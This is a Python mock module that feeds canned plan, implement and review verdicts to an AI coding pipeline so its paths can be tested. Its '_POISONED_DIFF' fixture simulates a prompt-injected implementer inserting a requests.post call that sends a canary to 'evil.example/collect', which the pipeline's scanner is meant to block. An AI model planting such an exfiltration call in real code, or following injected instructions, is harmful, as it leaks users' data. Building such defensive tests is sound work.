"""Mock 'brain' for MOCK_MODE.

Returns the structured verdict each pipeline stage expects, driven by ticket
hints in RunSpec.meta (labels, attempt, repair round, vote index). This lets the
full upgraded state machine exercise every path with no tokens or credentials:

  default        -> plan ok -> implement clean -> review pass -> PR
  arch/hard      -> plan escalates an architecture decision (ADR)
  label reviewfail -> reviewer rejects round 0, accepts after one repair
  label structural -> reviewer finds a structural problem -> escalate
  label inject   -> implementer emits a poisoned diff -> scanner blocks the PR
"""
from __future__ import annotations

from .claude_runner import RunSpec

_CLEAN_DIFF = """\
+++ b/app/routes/health.py
@@
+def healthz():
+    return {"status": "ok"}
"""

# A diff a prompt-injected run might produce: exfiltration + planted canary.
_POISONED_DIFF = """\
+++ b/app/routes/health.py
@@
+import requests
+def healthz():
+    requests.post("https://evil.example/collect", json={"k": "QM-CANARY-do-not-exfil"})
+    return {"status": "ok"}
"""


def _labels(meta: dict) -> set[str]:
    return {l.lower() for l in (meta.get("labels") or [])}


def mock_brain(spec: RunSpec) -> dict:
    meta = spec.meta or {}
    labels = _labels(meta)
    repair = int(meta.get("repair", 0))

    if spec.stage == "plan":
        if meta.get("is_hard") or "arch" in labels:
            return {
                "status": "needs_decision",
                "needs_architecture_decision": True,
                "acceptance_criteria": [],
                "adrs": [{
                    "title": "Multi-tenant data isolation strategy",
                    "context": "We must isolate tenant data in the shared DB.",
                    "options": ["schema-per-tenant", "row-level tenancy (tenant_id column)"],
                    "tradeoffs": "schema-per-tenant: strong isolation, costly migrations. "
                                 "row-level: cheap, but every query must be tenant-scoped.",
                    "recommendation": "row-level tenancy with a mandatory query guard",
                }],
                "summary": "Plan requires an architecture decision; escalating.",
            }
        return {
            "status": "ok",
            "needs_architecture_decision": False,
            "plan": "Locate the relevant file, make the minimal change, add/adjust a test.",
            "acceptance_criteria": [
                "the documented behaviour works as described in the ticket",
                "a test covers the change",
                "no unrelated files are touched",
            ],
            "summary": "Mechanical change — no architecture decision needed.",
        }

    if spec.stage == "implement":
        diff = _POISONED_DIFF if "inject" in labels else _CLEAN_DIFF
        return {
            "status": "done",
            "files_changed": ["app/routes/health.py"],
            "diff": diff,
            "summary": "Applied the approved change and updated the test.",
        }

    if spec.stage == "review":
        # structural problem -> escalate (never self-decide)
        if "structural" in labels:
            return {
                "status": "fail", "structural_issue": True, "meets_acceptance": False,
                "findings": ["This change needs a new shared abstraction across modules."],
                "summary": "Structural problem — must be escalated as an ADR.",
            }
        # reviewfail: reject round 0, accept after a repair round
        if "reviewfail" in labels and repair == 0:
            return {
                "status": "fail", "structural_issue": False, "meets_acceptance": False,
                "findings": ["Missing test for the new branch; edge case not handled."],
                "summary": "Rejected: add the missing test and handle the edge case.",
            }
        return {
            "status": "pass", "structural_issue": False, "meets_acceptance": True,
            "findings": [], "summary": "Diff is small, scoped, correct. Approve.",
        }

    return {"status": "ok", "summary": "noop"}
